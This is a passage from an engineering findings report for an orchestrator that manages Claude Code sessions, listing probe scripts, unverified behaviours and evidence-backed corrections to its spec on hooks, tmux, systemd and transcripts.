| linux: git | `$P/linux-process-git/probe_git.sh` | `rev-parse`, `remote get-url` forms, `worktree list --porcelain` | `bash $P/linux-process-git/probe_git.sh` | 2026-09-14 16:21 |
| gap-fill: systemd + tmux | `$P/gap-fill/probe_systemd_tmux.sh` | tmux server cgroup under a user unit; stop/restart survival; user-manager PATH; `claude` inside a unit | `bash $P/gap-fill/probe_systemd_tmux.sh` | 2026-09-14 17:05 |
| gap-fill: pane env | `$P/gap-fill/probe_tmux_env.sh` | Which environment a new pane receives | `bash $P/gap-fill/probe_tmux_env.sh` | 2026-09-14 17:38 |
| gap-fill: tmux naming | `$P/gap-fill/probe_tmux_naming.sh` | `:`/`.` rewriting, `-t` resolution, `$TMUX` inside a pane | `bash $P/gap-fill/probe_tmux_naming.sh` | 2026-09-14 17:07 |
| gap-fill: attach + keys | `$P/gap-fill/probe_tmux_attach_keys.sh` (+ `keydump.py`) | Second client vs `resize-window`; raw key bytes into a pane | `bash $P/gap-fill/probe_tmux_attach_keys.sh` | 2026-09-14 17:08 |
| gap-fill: TUI keys | `$P/gap-fill/probe_keys_claude.py` | History Up, bracketed paste, Ctrl-C, Esc in the Claude Code TUI | `python3 $P/gap-fill/probe_keys_claude.py` | 2026-09-14 18:01 |
| gap-fill: interrupt | `$P/gap-fill/probe_interrupt.py` | Esc / C-c / SIGINT during a turn: hooks and transcript | `python3 $P/gap-fill/probe_interrupt.py [--real]` | 2026-09-14 17:28 |
| gap-fill: argv brief | `$P/gap-fill/probe_argv.py`, `probe_argv_limits.sh` | Brief as argv through `tmux new-session`: auto-submit, byte-exactness, ~16 KB limit, leading `-` | `python3 $P/gap-fill/probe_argv.py && bash $P/gap-fill/probe_argv_limits.sh` | 2026-09-14 17:33 |
| gap-fill: effort | `$P/gap-fill/probe_effort.py` | `--effort` values, invalid handling, request mapping (mock), hook `effort` | `python3 $P/gap-fill/probe_effort.py` | 2026-09-14 17:15 |
| gap-fill: SDK server_info / approval | `$P/gap-fill/sdk_probe.py` | Initialize `models[]` keys; `can_use_tool` blocking for 630 s | `<venv>/bin/python $P/gap-fill/sdk_probe.py server_info\|approval_timeout [--cli /root/.local/bin/claude]` | 2026-09-14 17:11 |
| gap-fill: transcript append | `$P/gap-fill/probe_transcript_append.py` | Append-only and whole-line writes (34 changes, 2 ms poll) | `python3 $P/gap-fill/probe_transcript_append.py` | 2026-09-14 17:54 |
| gap-fill: config scopes | `$P/gap-fill/probe_config_scopes.py` | Hooks hot-added to a running session; user-scope hooks with `_shepherd_managed`; `claude mcp add -s user`; MCP permission prompt | `python3 $P/gap-fill/probe_config_scopes.py hot\|user\|mcp` | 2026-09-14 17:39 |
| gap-fill: MCP permission in -p | `$P/gap-fill/probe_mcp_perm_p.py`, `probe_mcp_add_env.sh` | Permission-rule spellings and sources for MCP tools; `mcp add -e` argument order | `python3 $P/gap-fill/probe_mcp_perm_p.py && bash $P/gap-fill/probe_mcp_add_env.sh` | 2026-09-14 18:12 |
| gap-fill: pidfd + pty | `$P/gap-fill/probe_pidfd_pty.py` | pidfd exit of a non-child; Claude Code TUI under `pty.fork` | `python3 $P/gap-fill/probe_pidfd_pty.py` | 2026-09-14 17:58 |
| gap-fill: compaction + SessionEnd | `$P/gap-fill/probe_autocompact_real.py`, `probe_lifecycle_end.py` | `PreCompact{auto}`/`PostCompact`, kill mid-compaction, `SessionEnd.reason` resume/logout | `python3 $P/gap-fill/probe_autocompact_real.py && python3 $P/gap-fill/probe_lifecycle_end.py compact resume logout` | 2026-09-14 17:52 |
| gap-fill: TUI elicitation | `$P/gap-fill/probe_elicitation_tui.py` (+ `mcp_stub.py`) | `elicitation_dialog`; URL mode rejected by the client | `python3 $P/gap-fill/probe_elicitation_tui.py` | 2026-09-14 17:42 |
| gap-fill: cross-version resume | `$P/gap-fill/probe_cross_version_resume.sh` | Resume 2.1.259 ↔ 2.1.270 | `bash $P/gap-fill/probe_cross_version_resume.sh` | 2026-09-14 17:57 |
| gap-fill: WebSocket | `$P/gap-fill/probe_websocket.py` | No WS library; stdlib RFC 6455 handshake works | `python3 $P/gap-fill/probe_websocket.py` | 2026-09-14 17:16 |
| gap-fill: binary context | `$P/gap-fill/extract_binary_context.py` | Binary text around values that could not be provoked | `python3 $P/gap-fill/extract_binary_context.py` | 2026-09-14 17:43 |
| gap-fill: cc10x check | `$P/gap-fill/check_cc10x.sh` | cc10x hooks did not fire in real-config runs | `bash $P/gap-fill/check_cc10x.sh` | 2026-09-14 18:02 |
| DEFERRED: Jira REST | — | JQL query, statusCategory, workflow transitions / IllegalTransition, Sub-task child create, priority names, `updated` cursor (spec l.1293–1302, 505–512, 537–541; D5) | — | not run (M5) |
| DEFERRED: Notion API | — | Database query filter `{property,status:{does_not_equal}}`, Status property patch, per-database children support, ~3 req/s limit (l.1275–1289, 511, 2328) | — | not run (M6) |
| DEFERRED: connectors / OAuth | — | Third-party connector MCP servers (Jira, Datadog, GitLab, Slack, Notion, Figma): OAuth/token flows, advertised tool lists, `auth_error` health (l.1567–1605, D20) | — | not run (M4.5) |
| DEFERRED: SDK MCP remount | — | `toggle_mcp_server` / `reconnect_mcp_server` / `get_mcp_status` for remount at a turn boundary and connector health polling (l.1600–1605); methods exist in source only | — | not run (M4.5) |
| DEFERRED: macOS drivers | — | Every Linux-specific shape above (procfs, systemd, XDG, SO_PEERCRED, pidfd) re-probed for macOS (launchd, libproc, Keychain) | — | not run (after D39) |
| DEFERRED: Secret Service | — | `secret-tool` store/lookup with attribute `service=shepherd` and the 0600 fallback (l.2049). Consumers are connectors (M4.5), providers (M5) and the verdict lane (D34). This host has no Secret Service | — | not run (M4.5+) |
| DEFERRED: provider HTTP hardening | — | urllib redirect disabling and hostname allowlist (l.2071–2087) | — | not run (M5) |
| DEFERRED: queue-worker worktrees | — | `<repo>-wt/<KEY>/` on `feat/<KEY>`, created lazily per repo (l.1374, 1385; D15/D22). git porcelain already probed | — | not run (M5) |
| DEFERRED: LLM verdict lane | — | claude-haiku-4-5 over the transcript tail with an Anthropic API credential (l.1022–1036, D34) | — | not run (after M2) |
| DEFERRED: other engines | — | `codex exec`, AGY print mode / LSP RPC, `~/.gemini/antigravity/brain/` JSONL, Codex "no hooks", Codex effort ladder, Codex stdio MCP (l.547–552, 1433) | — | not run (§17) |
| DEFERRED: ApiLoopMaster exporters | — | OpenAI functions array and Anthropic Messages `tools=[...]` shapes, `base_url` vendors (l.1481–1482, D30) | — | not run (deferred) |
| DEFERRED: Slack Socket Mode | — | NotificationChannel (l.2293) | — | not run (after M6) |
| DEFERRED: DeployProvider | — | GitLab pipelines / Datadog prod verification (l.2309) | — | not run (deferred) |
| DEFERRED: persistent unit files | — | `~/.config/systemd/user` unit files + `daemon-reload`, `shepherd install` venv packaging (l.2209–2219). Transient-unit semantics already probed | — | not run (M6) |
| DEFERRED: SDK auth-policy quote | — | Anthropic Agent SDK docs on claude.ai login for third-party products (l.1557) | — | not run (multi-user deployment only) |

## Not verified

Each item below is still unverified after every surface, the gap-fill pass included. The reason follows the item.

**Hooks**
- `TeammateIdle` event: needs the agent-teams feature and was not attempted. Schema from the binary only.
- `WorktreeRemove` event: no worktree was ever created, because the WorktreeCreate capture hook returned no path. Schema from the binary only.
- `StopFailure.error` values `oauth_org_not_allowed`, `account_on_hold`, `verification_required`, `cloud_credential_error`: they need real org, account or 3P-cloud states.
- `StopFailure.error` = `overloaded`: the binary has 0 assignment sites, and a mock 529 produced `server_error`.
- `StopFailure` classes other than `model_not_found` against the real API: `rate_limit`, `authentication_failed`, `billing_error`, `server_error`, `invalid_request`, `unknown` and `max_output_tokens` were provoked only against the local mock API.
- `Notification.notification_type` values `agent_needs_input` and `worker_permission_prompt`: they need background agents or agent teams. Binary context only.
- `Notification.notification_type` = `elicitation_url_dialog`: the stdio MCP client rejects URL-mode elicitation (-32602). Remote/HTTP MCP servers were not tried.
- `Notification.notification_type` values `quota_auto_resume_*`, `auth_success`, `agent_completed`, `push_notification`, `computer_use_*`: they need quota exhaustion, auth flows or computer use. Binary list only. It is also unknown whether `quota_*` carries a resume time, which matters for the `quota_paused` UI (l.957, 973, 1085, 1851).
- `UserPromptSubmit.source`/`session_title`, `SessionStart.agent_type`, `Notification.title`, `TaskCreated.teammate_name`/`team_name`: never present in 429 captures. `--agent` sessions and agent teams were not tried. (`session_title` was observed in the TUI after `/rename`; see tmux-tui.)
- `PreModelSwitch`/`PostModelSwitch` `source` values `picker`, `sdk`, `auto`, `resume`: only `/model` in `-p` (`command`) was tried, and `--resume` with a different `--model` emitted no switch event.
- `Elicitation` URL mode; `UserPromptExpansion` `mcp_prompt`; `InstructionsLoaded` reasons other than session_start; `ConfigChange` sources other than local; `DirectoryAdded` `register_repo_root`: only one variant of each was provoked. (Form-mode `accept` was verified in the TUI by gap-fill.)
- `PermissionDenied` on haiku and in non-auto modes: auto mode is unsupported on haiku. The event was produced only on sonnet under the auto-mode classifier.
- `bypassPermissions` permission_mode: refused when running as root on this host.
- `MessageDisplay` multi-chunk (`index > 0`, `final:false`): seen once, but that capture was overwritten.
- `PostToolUseFailure.is_interrupt = true`: Esc, C-c and SIGINT during a running tool produced no PostToolUseFailure at all.
- Hooks in the real `~/.claude/settings.json`, and whether Claude Code keeps `_shepherd_managed` when it rewrites settings (`/hooks`, `/config`): probe safety rules forbid touching the real file. User scope was verified only through an isolated `CLAUDE_CONFIG_DIR`.
- **`$CLAUDE_CONFIG_DIR/.claude.json`** — that setting `CLAUDE_CONFIG_DIR` relocates the **`.claude.json` trust/projects file**, as opposed to user-scope *settings*. `engines/claude_code/trust.py`'s `config_file()` implements the redirect, and it is **inferred, not captured**: the cited probe (`probe_claude_json.py:7`) hardcodes `expanduser('~/.claude.json')` and never reads the variable, and what the probes did drive through `CLAUDE_CONFIG_DIR` was user-scope settings, a different file. Under this project's binding rule — no data shape asserted without a real captured example — this one is unverified, and no capture was invented for it (T10-R2). **Degrade if it is wrong:** on a host that sets `CLAUDE_CONFIG_DIR`, the real file stays at `~/.claude.json` while `trust_state` looks elsewhere, so every workspace answers `unknown` forever — a counted unknown whose `source` names the path it looked at, not a silent `False`. Verifying it needs a session started with `CLAUDE_CONFIG_DIR` set, a trust dialog accepted, and both candidate paths listed afterwards.

**Transcripts and session state**
- `pr-link` entry, live: creating a real PR was out of scope. The shape is known from a static binary grep only (spec l.681, 1881).
- `summary` entry type: `/compact` wrote `compact_boundary` + `isCompactSummary` instead. Named in the binary merge table only.
- Transcript `compact_boundary` with `trigger:auto`: gap-fill verified the hook payload `PreCompact/PostCompact{trigger:auto}` but did not cite the transcript entry. It appears once in user-data counts.
- `<sessionId>/custom-title.json` sidecar production: seen in 1 user file only. `--name` did not create one, and the tmux `/rename` probe cited the registry sidecar, not this file.
- Top-level `effort` in a haiku session: haiku never writes it. The example comes from a sonnet sibling throwaway.
- `<synthetic>` entries with `error` = `rate_limit`/`authentication_failed`: cannot be provoked safely. Counts come from user data only.
- `claude agents --json` entries for `--bg` and `--all` completed sessions: `claude --bg` was not started beside the user's live Remote Control sessions.
- `file-history-delta`, `frame-link`, `artifact-*` and the attachment subtypes that probes did not produce: field lists come from user data only.
- Entry types named only in the binary merge table (`continued-in`, `fork-context-ref`, `content-replacement`, `ended-by-model`, `tag`, `relocated`, `agent-color`, `agent-setting`, `history-suppression`, `attribution-snapshot`, `marble-origami-*`): never observed.
- Nested (spawnDepth 2) Agent subagents, live: not provoked. Seen only in user meta.json counts.
- `tool-results/*.txt` sidecar: no probe produced a large tool output.
- `--resume` (without fork) of a session live in another process; `--fork-session` combined with `--session-id`: not attempted.
- Whether `-p` sessions appear in `claude agents --json`: the transcripts probe was inconclusive (the process may already have exited). linux-process-git did show that `-p` writes the registry file.
- Transcript append-only under every timing: a 2 ms poller saw no partial line or rewrite in 34 changes. Sampling cannot prove a race impossible.
- `/rewind` with "Restore code and conversation": the chosen rewind point had no code changes.

**TUI under tmux**
- Esc on the trust dialog; Esc and "Tab to amend" on the permission dialog; text starting with a digit typed into a permission dialog: only Enter, Down and letters were sent.
- Whether a slow (non-fork-free) SessionEnd hook finishes when the tmux pane is killed: only fork-free bash hooks were used.
- Headless `/rename` (`claude --resume <id> -p '/rename …'`) against a session live in another process: not attempted, because it risks two writers on one transcript.
- Whether `idle_prompt` repeats after the first 60 s, and whether `permission_prompt` repeats for a long-unanswered dialog: every run moved on first.
- `pane_title` glyph changes while busy: captured only at idle moments.
- Behaviour with Remote Control on: scripted runs set `remoteControlAtStartup:false`.
- Second tmux client typing at the same time as browser writes: only size interaction, read-only attach and byte delivery were tested.
- SIGINT, C-c and Esc-during-streaming interrupts against the real API: those ran against the mock backend. The real-API run covered only Esc during a tool call.

**Agent SDK and MCP**
- `setting_sources=[]` excluding the cc10x user plugin: every run disabled cc10x through flag settings, so the effect could not be isolated.
- `setting_sources=[]` excluding user-scope `~/.claude/CLAUDE.md`: none exists on this host, and creating one would edit user config.
- `interrupt()` while an in-process MCP tool handler is running: tested only during streaming and during a pending `can_use_tool`.
- `ResultMessage` subtypes `error_max_turns`, `error_max_budget_usd`, API-error results, `structured_output`, `deferred_tool_use`: not provoked.
- `MasterCapabilities.supports_parallel_tool_calls`: the model never emitted parallel `tool_use` blocks.
- `ServerToolUseBlock`/`ServerToolResultBlock`, Task* messages, `HookEventMessage`: no server tools, subagents or `include_hook_events` were used.
- Addressing the SDK master through its `messaging_socket_path` (`/run/user/0/cc-socks/<pid>.sock`): observed but not probed.
- stdio MCP `tools/list` pagination, resources/prompts, server-initiated sampling: the probe server implemented tools only.
- `can_use_tool` waits beyond 630 s; resume across version pairs other than 2.1.259 ↔ 2.1.270: only these were run.

**Linux, systemd, git, host**
- Secret Service store/lookup/clear round trip and gnome-keyring locked-collection behaviour: this host has no Secret Service or keyring daemon, and nothing was installed.
- User services, tmux-spawn scopes and `/run/user/0` on logout with `Linger=no`, and after `enable-linger` (l.2221–2225): that would end the login session hosting live Remote Control sessions.
- XDG values printed from inside a transient unit's shell: systemd expanded the variables in `ExecStart` first. The facts come from `show-environment`.
- Registry file absent at the interactive SessionEnd hook: seen once, in a capture that was overwritten, so the ordering is recorded as racy.
- Shepherd and its fleet as an unprivileged user (D39 "no root required", l.143, 409, 2209): every probe ran as root, which is the actual user here. Cross-uid denial was checked with `runuser -u nobody` only.
- `comm` of claude processes spawned by the Agent SDK: the SDK is not installable on the system python (no pip).
- Worktree basename collisions (`.git/worktrees/<name>` suffixing): not provoked.
- Slug rule on non-Linux platforms or with invalid UTF-8 paths: out of scope (D39).

**Not probeable on this host (critic)**
- xterm.js rendering the `capture-pane -e` snapshot plus the `pipe-pane` stream identically (l.1147–1157): no node, npm, tsc or browser here.
- Browser notification and sound on entering needs_you (l.1790–1791): no browser. Notification permission for `http://127.0.0.1` is untested.

**Closed by M4 T1's probes** (2026-09-17, `docs/probes/2026-09-17-m4-sdk/FINDINGS.md`): `interrupt()` while an in-process MCP tool handler is running (P2 — nothing is cancelled and nothing is told); `setting_sources=[]` excluding the cc10x user plugin (P4 — it does exclude it, measured on a host with cc10x enabled). The two rows above are kept in place, unedited, so the question and its answer stay side by side.

**Closed by gap-fill** (were unverified on their first surface): `PreCompact/PostCompact{trigger:auto}`; `SessionEnd.reason` `resume` and `logout`; user-scope hook config (isolated config dir); registry `status:"waiting"` + `waitingFor` (tmux-tui `06-sidecar-permission.json`); tmux server survival across a unit stop/restart; `can_use_tool` blocking past 600 s; tier-2 MCP permission prompt in the TUI; resume across a Claude Code upgrade (one pair).

## Spec corrections

This section lists every misalignment the surface auditors CONFIRMED, plus every misalignment the gap-fill pass reported. Gap-fill was not separately audited; its rows are marked (gap-fill). Rows are sorted by spec line in `docs/specs/orchestrator-platform.md` as of 2026-09-14. When several surfaces found the same line, their facts are merged into one row. Evidence paths are relative to `docs/probes/2026-09-14-schemas/`.

| Spec line | Spec says | Reality | Evidence |
|---|---|---|---|
| 115 (D12 reasoning) | Direct injection into a running session corrupts its state | Claude Code queues a mid-turn write itself: a `queue-operation` enqueue, then a remove with reason `absorbed_mid_turn`, and the write is merged into the running turn. `UserPromptSubmit` fires with the running turn's `prompt_id`, exactly one `Stop` follows, and the original instruction is silently superseded. The failure is a silent merge, not corruption. The mailbox policy is still right | `tmux-tui/run-20260914T154946Z/07-10-11-transcript-excerpt.jsonl`, `07-stop-count.txt`, `hooks-a.jsonl` l.18–24 |
| 117 (D14), 1139 | tmux survives sessiond restart/upgrade because the tmux server is its own process | A tmux server first started inside sessiond's systemd user unit stays in the unit's cgroup; only panes move to `tmux-spawn-*.scope`. The default `KillMode=control-group` kills the server and every pane on `systemctl --user stop` and on restart. It survives only with `KillMode=process`, or when the server is started in its own scope (`systemd-run --user --scope`) (gap-fill) | `gap-fill/systemd-tmux-20260914T170532Z/q1-cgstop.txt`, `q1-cgrestart.txt`, `q1-procstop.txt`, `q1-scopestop.txt` |
| 128 (D24) | Evidence exists in `~/.claude/projects/*.jsonl` | That glob matches 0 files. Main transcripts are at `projects/<slug>/<sid>.jsonl`, subagents at `<slug>/<sid>/subagents/agent-*.jsonl`, and workflow agents at `…/subagents/workflows/wf_*/agent-*.jsonl`. A `-p --fork-session` leaves a permanent extra `<newId>.jsonl` in the target's project dir | `transcripts/captures/layout-listing.txt`, `transcripts/captures/fork-filecheck.txt` |
| 143 (D39), 2209–2219 | Daemons run as systemd user services and spawn `claude` | The user manager's PATH lacks `/root/.local/bin`. In a unit without `Environment=PATH`, `claude` is not found (exit 127) and every tmux spawn dies at once. With PATH set, auth and a `-p` turn work (gap-fill) | `gap-fill/systemd-tmux-20260914T170532Z/q2-user-manager-environment.txt`, `q2-unit-claude-resolve.txt`, `q1-nopath.txt`, `q2b-unit-claude-resolve-with-path.txt`, `q2c-unit-auth-turn.txt` |
| 406 vs 1150 | Stack is stdlib HTTP + SSE; the browser terminal uses WebSocket | The system python3 has no WebSocket library (websockets, wsproto, aiohttp and tornado are missing, and there is no pip). A stdlib-only RFC 6455 handshake and frame round-trip works, so WebSocket means hand-rolled code that the stack line does not mention (gap-fill) | `gap-fill/websocket-20260914T171610Z/imports.json`, `handshake.json` |
| 411 | No bundler beyond tsc; vanilla TypeScript frontend | node, nodejs, npm, npx, tsc, corepack, bun and deno are absent, and there is no nvm/volta/fnm. This is an unstated host prerequisite | `linux-process-git/captures/secrets-runtime.txt` |
| 427, 1153 | Browser keystrokes are a direct write to the pty | Writing to the pane's tty device goes to screen output, not program input (0 bytes read). Key bytes must go through `tmux send-keys -H` (byte-exact) or `-l`. `paste-buffer` converts LF to CR, and adds bracketed-paste markers only with `-p` (gap-fill) | `gap-fill/tmux-attach-keys-20260914T170850Z/keys-keydump.jsonl`, `keys-pane-screen.txt` |
| 429 (Runner.signal), 965 | Explicit interrupt goes through `Runner.signal` | SIGINT to the claude pid does not interrupt; it terminates Claude Code: `SessionEnd{reason:other}`, pane exit status 0, and "Resume this session with" is printed. An interrupt must be `send-keys Escape` (or C-c) (gap-fill) | `gap-fill/interrupt-20260914T172251Z/results.json`, `hooks.jsonl`, `sigint_tool-screen-after.txt` |
| 453 | `ModelProvider.models()` returns id, context, cost, release | Initialize `models[]` has `value`, `resolvedModel`, `displayName`, `description`, `supportsEffort`, `supportedEffortLevels`, `supportsAdaptiveThinking`, `supportsFastMode`, `supportsAutoMode`. There is no context-window, cost or release field; context appears only as a `[1m]` suffix or in prose (gap-fill) | `gap-fill/sdk-server_info-syscli-20260914T171115Z/server-info.json`, `gap-fill/sdk-server_info-20260914T171112Z/server-info.json` |
| 550 | hooks: rich (32 events) | 2.1.270 defines 33 hook event names, and the settings-validator and SDK lists are identical. 31 distinct events fired in 429 live captures | `hooks/binary/hook-events.json`, `hooks/live/R03_config_unknown_event_name/doctor.txt` |
| 633 | `vcs_remote` is null for non-git | It is also unavailable for a git repo with no remote: `remote get-url origin` gives rc=2 "error: No such remote" (e.g. `/root/Shepherd`). It is ambiguous when a repo has several remotes. `get-url` returns the insteadOf-expanded URL, and the same repo appears in scp-like, `ssh://` and https ± `.git` spellings | `linux-process-git/captures/git.txt` §A, §B, §G |
| 664 (and 2446) | `brief` for attached sessions = the transcript's `lastPrompt` | `lastPrompt` is the most recent prompt, not the task: it became "Reply with exactly RESUMED." after a resume. It is capped at 200 chars + U+2026, newlines are flattened to spaces, and it is absent on 3/443 user entries. In a `-p --resume --fork-session` fork, the fork's own `last-prompt` entries carry the history's FIRST prompt | `transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/6fcb72cd-b6f3-4acd-a43d-6c7e3e89bd28.jsonl` l.15, `transcripts/captures/longprompt-input.txt`, `…/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` l.45, `…/7c27bb7f-5390-48b0-8b2e-cf4004113d09.jsonl` l.37, 44, `transcripts/captures/fork-meta.txt` |
| 666 | `effort` is top-level; `model` is at `message.model` | This holds when effort is written (opus in user data, sonnet in a throwaway). Haiku never writes top-level `effort`: 0/319 entries, including with `--effort low`. `perTurnEffort` is always null. `message.model` is `<synthetic>` on client-generated entries | `transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/667257d2-9430-4714-a8b1-fb07a95ae0bf.jsonl`, `transcripts/captures/effort-meta.txt`, `transcripts/copies/-tmp-shp-hooks-effort-7yb7myuc/5c59934b-3bd1-43ab-9506-a6a16f581034.jsonl` l.24 |
| 680, 886 | `repos_touched` accumulates repo ids from FileChanged | FileChanged fires only for declared watch paths: live, for hook-returned `hookSpecificOutput.watchPaths`, and per the binary, for the `\|`-separated file names in the FileChanged matcher. It never fires for files the agent edits; a Write in acceptEdits produced none | `hooks/live/S13_watch_cwd_config/debug-hooklines.txt`, `hooks/live/S09_perm_acceptEdits_write_inside/events.jsonl` |
| 681 | `pr_url` is free: the transcript emits `pr-link` entries | 0 `pr-link` entries in user data and in every probe. The binary writer `{type:'pr-link',sessionId,prNumber,prUrl,prRepository,timestamp}` runs only when a PR is tracked (`linkSessionToPR`). "Free" is unproven, and `pr_url` may stay null | `transcripts/captures/binary-metadata-table.txt` l.6–7, `transcripts/captures/real-transcripts-stats.json` |
| 713–714 | Claude Code writes `ai-title`, so a title arrives for free, including for attached sessions | True for unnamed sessions. A `--name` session gets `custom-title` + `agent-name` at line 0 and no `ai-title` (both named throwaways). The spec never names `custom-title` | `transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/8b86e691-5e1a-46b3-9bc0-bc7dc694abb3.jsonl`, `transcripts/copies/-tmp-shp-schemas-regint-KD6xG3-work/2efd1f5f-1b93-481a-8469-0f589a48d7ae.jsonl` |
| 724–731 | Rename write-back candidate: append an `ai-title` entry; `can_set_title` False until probed | `ai-title` is the wrong channel; user names use `custom-title`. Typing `/rename <title>` into the pty, or spawning with `--name`, makes Claude Code write `custom-title` + `agent-name` itself, and Shepherd writes no file. The title then shows as registry `name`/`nameSource:user`, as `#{pane_title}` "✳ <title>", and as later SessionStart/UserPromptSubmit `session_title`. No hook fires at rename time. For owned sessions `can_set_title` can be True. Precedence between `ai-title` and `custom-title` was not determined | `transcripts/captures/binary-metadata-table.txt` l.5, `transcripts/captures/regint-registry-busy.json`, `tmux-tui/run-20260914T154946Z/10-rename-transcript-new-lines.jsonl`, `10-rename-after-fmt.txt`, `10-rename-hooks.txt`, `10-sidecar-after-rename.json` |
| 882 (with 664) | UserPromptSubmit sets `brief` | A system-injected `<task-notification>` prompt also fires UserPromptSubmit, with a new `prompt_id`. The optional `source` field was never present (57 captures), so injected prompts cannot be told apart from user prompts | `hooks/live/S18_agents_tasks/events.jsonl` |
| 885 (and 679) | `active_subagents` counted from SubagentStart / SubagentStop | Internal subagents emit `SubagentStop` with `agent_type:""` and no SubagentStart. Examples: compaction, and the post-turn prompt-suggestion helper. Counts: 2 of 4 SubagentStop in hooks captures; 10 stops and 0 starts across 4 TUI captures. A +1/−1 counter goes negative | `hooks/live/S05_compact/events.jsonl`, `hooks/live/I01_interactive/events.jsonl`, `tmux-tui/event-counts.txt` |
| 897–907 (with 312, 163) | `hookd.py` reads stdin, writes the UDS with a 250 ms timeout, always exits 0; it can neither block nor fail Claude Code | The stdin and exit-0 contract holds, but hooks block. A 3 s PostToolUse hook delayed PostToolBatch by 3.0 s. A PreToolUse hook with timeout 2 was cancelled after ~2.1 s. The default timeout is 600 s (binary `Mp=600000`). In `-p`, StopFailure is dispatched after shutdown begins: the Python capture hook ended with status 1 and wrote nothing (2/2 runs), while a fork-free bash hook succeeded, so the Python hook was probably killed. A Python SessionEnd hook was not killed | `hooks/live/S07_bad_model/debug-hooklines.txt`, `debug-extras.txt`, `hooks/live/R04_settings_flag/debug-hooklines.txt`, `hooks/live/R02_timeout_sync/events.jsonl`, `timing.txt`, `hooks/binary/runtime-source-snippets.txt` |
| 917 | PermissionDenied is a needs-you source | There is one dispatch site, called only when `decisionReason.type==='classifier' && classifier==='auto-mode'`. It fired once live (sonnet, auto mode). It never fired for dontAsk, deny rules, the `-p` auto-refusal, `--permission-prompts none`, a TUI Esc rejection, or a headless denial of a non-allowed MCP tool | `hooks/live/S20_perm_auto_deny/events.jsonl`, `hooks/live/S09_perm_*/events.jsonl`, `hooks/binary/runtime-source-snippets.txt` l.22, `agent-sdk-mcp/captures/stdio-mcp/hooks.jsonl` |
| 925–927, 881 | A hand-launched session registers itself via SessionStart on its first turn, with no filesystem polling | A session already running when hooks are installed (`settings.local.json` or user `settings.json`) fires UserPromptSubmit, MessageDisplay, Stop, ConfigChange and SessionEnd on its next turn, but never SessionStart. Registration must accept the first event of any kind from an unknown `session_id` (gap-fill). The spec also omits two discovery sources: `~/.claude/sessions/<pid>.json` (`sessionId`, `cwd`, `status` idle/busy/waiting, tmux, `name`, `nameSource`; written by interactive and `-p` sessions after trust, deleted on exit) and `claude agents --json`. `/proc` yields a session id only when `--session-id`/`--resume` is in argv, and the process's own `CLAUDE_CODE_SESSION_ID` belongs to its launcher | `gap-fill/config-scopes-20260914T173908Z/results.json`, `hot-local-hooks.jsonl`, `hot-user-hooks.jsonl`, `transcripts/captures/regint-registry-busy.json`, `regint-agents-busy.json`, `linux-process-git/captures/proc-C-snapshot.json`, `print-registry.txt` |
| 929–931 | Common fields on every hook event: session_id, prompt_id, transcript_path, cwd, permission_mode, effort.level, hook_event_name | Only `session_id`, `transcript_path`, `cwd` and `hook_event_name` are on every event. `prompt_id` is on 1/55 SessionStart and absent from InstructionsLoaded, Setup and WorktreeCreate. `permission_mode` never appears on SessionStart, SessionEnd, StopFailure, MessageDisplay, Notification, Task*, SubagentStart, Pre/PostCompact, model-switch, ConfigChange, CwdChanged, FileChanged, DirectoryAdded or Elicitation*. `effort` appears only in sonnet runs and in nonexistent-model runs; it never appears with haiku or in any TUI capture. TUI payloads add `scratchpad_dir`, which the spec does not list. No payload key is a timestamp | `hooks/live/_field-matrix.txt`, `tmux-tui/run-20260914T154946Z/field-matrix-a-and-supp.txt`, `tmux-tui/event-counts.txt` |
| 937 | needs_you = Notification ∈ {permission_prompt, idle_prompt, agent_needs_input, elicitation_dialog, elicitation_url_dialog} or an unresolved PermissionRequest | `permission_prompt` arrives 6.0 s after PermissionRequest, and only if the dialog is still unanswered (0/4 fast answers produced one). `idle_prompt` arrives 60.0 s after every Stop, so an idle TUI session flips to needs_you after a minute. Both are TUI-only; `-p` never emits them. Nothing resolves a PermissionRequest: it has no `tool_use_id`, no event follows a TUI Esc rejection, and in `-p` the refusal shows only in PostToolBatch. `elicitation_dialog` is verified in the TUI. `elicitation_url_dialog` cannot come from stdio `shepherd-mcp`, because 2.1.270 rejects URL mode with -32602. `agent_needs_input` was not observed. `worker_permission_prompt` is an unlisted value that may be a needs-you ask | `hooks/live/I01_interactive/events.jsonl`, `steps.txt`, `hooks/live/S09_perm_default_write_outside/events.jsonl`, `hooks/binary/enum-sources.txt`, `tmux-tui/run-20260914T154946Z/04-idle-delay.txt`, `06-permission-delay.txt`, `gap-fill/elicitation-tui-20260914T174206Z/hooks.jsonl`, `mcp-stub-messages.jsonl` |
| 938, 964 (session table 640–698) | `stopped` on observed process exit; `crashed` = exit ≠ 0 with no preceding Stop | The session table has no pid or process-start column, so exit of an attached session cannot be observed and pid reuse is not guarded. `(pid, /proc stat field 22)` equals registry `procStart` in 24/24 hook frames, and the hook env `CLAUDE_PID` equals the owning pid in 24/24. `pidfd_open`+poll reports a non-child's exit within ~40 ms, but `waitid(P_PIDFD)` gives ECHILD. So attached sessions yield an exit time but never an exit code. Owned sessions get the code only from tmux `pane_dead_status` with remain-on-exit on | `linux-process-git/captures/proc-peercred.jsonl`, `proc-hooks.jsonl`, `gap-fill/pidfd-pty-20260914T175854Z/results.json` |
| 940 | `starting` holds until the first signal or SPAWN_TIMEOUT_S (60), then stopped/crashed | A TUI spawned into an untrusted dir stops on the trust dialog, with no hook (project settings or `--settings`) and no registry file for ≥15 s. The dialog is pty output, which l.939 counts as running, so the session is mislabelled running or stopped/crashed, never blocked on a human. The default option is "No, exit": a blind Enter exits with status 1 and the SessionEnd hook is skipped | `tmux-tui/run-20260914T154946Z/01-hooks-before-trust.txt`, `01-trust-dialog-sidecar.json`, `01b-list-sessions-after-refuse.txt`, `debug-b.log` l.59 |
| 951, 956, 971 | StopFailure carries `error_type` | The field is `error`: 23/23 captures have `error`, and none has `error_type` | `hooks/live/S07_bad_model/events.jsonl`, `hooks/binary/hook-input-schemas.txt` |
| 956 | `rate_limited` when error ∈ {rate_limit, overloaded} | A mock HTTP 529 `overloaded_error` produced `error:"server_error"`. The binary has 0 assignments of `error:"overloaded"`, so a 529 classifies as server_error. The HTTP error was simulated | `hooks/live/S08_mock_http529/events.jsonl`, `hooks/binary/stopfailure-error-assignments.txt` |
